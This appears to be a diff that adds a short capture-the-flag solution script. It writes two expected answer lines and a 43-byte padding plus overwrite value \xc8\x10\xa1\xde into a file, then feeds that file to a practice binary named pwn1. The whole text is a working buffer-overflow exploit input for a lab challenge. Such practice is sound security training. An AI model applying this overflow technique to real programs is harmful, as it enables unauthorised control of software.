@@ -1,0 +1,4 @@
+(echo "Sir Lancelot of Camelot";echo "To seek the Holy Grail.";python -c 'print"A"*43+"
+\xc8\x10\xa1\xde"') > a.txt
+
+./pwn1 < a.txt
